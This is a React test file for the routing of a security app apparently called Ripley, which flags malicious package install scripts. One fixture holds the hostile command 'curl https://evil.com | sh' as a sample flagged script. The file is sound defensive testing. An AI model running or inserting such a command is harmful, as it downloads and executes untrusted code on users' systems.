import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { act, cleanup, render, screen } from "@testing-library/react";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";

import App from "./App";
import { commands, type GuardEvent } from "./lib/bindings";
import { useGuardStore } from "./store/guard";
import { useCommandPaletteStore } from "./store/command-palette";

vi.mock("./hooks/useGuardEvent", () => ({
  useGuardEvent: () => {},
}));

const sampleEvent: GuardEvent = {
  id: "guard-1",
  package: "evil-pkg",
  version: "1.0.0",
  script: "curl https://evil.com | sh",
  risk_level: "high",
  matched_rules: ["NET001"],
};

function renderApp() {
  const client = new QueryClient({
    defaultOptions: { queries: { retry: false } },
  });
  return render(
    <QueryClientProvider client={client}>
      <App />
    </QueryClientProvider>,
  );
}

beforeEach(() => {
  window.location.hash = "";
  vi.spyOn(commands, "listAlerts").mockResolvedValue({ status: "ok", data: [] });
  vi.spyOn(commands, "readSettings").mockResolvedValue({
    status: "ok",
    data: {
      poll_interval_secs: 600,
      launch_at_login: false,
      monitor_enabled: false,
      monitor_watch_processes: false,
      monitor_watch_persistence: false,
      monitor_watch_lockfiles: false,
      guard_mode: "audit",
      guard_timeout_secs: 60,
      guard_sandbox: false,
      posture_strict: false,
      posture_require_lockfile: false,
    },
  });
  vi.spyOn(commands, "reportVisible").mockResolvedValue({ status: "ok", data: null });
  act(() => {
    useGuardStore.setState({ currentEvent: null, inFlight: false });
    useCommandPaletteStore.setState({ open: false });
  });
});

afterEach(() => {
  cleanup();
  vi.restoreAllMocks();
});

describe("App routing", () => {
  it("renders the alerts view by default (cold path)", () => {
    renderApp();
    expect(screen.getByRole("heading", { name: "Ripley" })).toBeInTheDocument();
    expect(screen.getByTestId("alerts-view")).toBeInTheDocument();
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
  });

  it("switches to the guard dialog when an event arrives (warm path)", () => {
    renderApp();
    act(() => {
      useGuardStore.setState({ currentEvent: sampleEvent });
    });
    expect(screen.getByRole("alertdialog")).toBeInTheDocument();
    expect(screen.queryByTestId("alerts-view")).not.toBeInTheDocument();
  });

  it("returns to the active route when the event is cleared", () => {
    renderApp();
    act(() => {
      useGuardStore.setState({ currentEvent: sampleEvent });
    });
    expect(screen.getByRole("alertdialog")).toBeInTheDocument();
    act(() => {
      useGuardStore.setState({ currentEvent: null });
    });
    expect(screen.queryByRole("alertdialog")).not.toBeInTheDocument();
    expect(screen.getByTestId("alerts-view")).toBeInTheDocument();
  });

  it("switches views when the hash changes", () => {
    renderApp();
    expect(screen.getByTestId("route-label")).toHaveTextContent("alerts");
    act(() => {
      window.location.hash = "/settings";
      window.dispatchEvent(new HashChangeEvent("hashchange"));
    });
    expect(screen.getByTestId("route-label")).toHaveTextContent("settings");
    expect(screen.getByTestId("settings-view")).toBeInTheDocument();
  });

  it("falls back to the default route when the hash is unknown", () => {
    window.location.hash = "/bogus";
    renderApp();
    expect(screen.getByTestId("route-label")).toHaveTextContent("alerts");
    expect(screen.getByTestId("alerts-view")).toBeInTheDocument();
  });
});
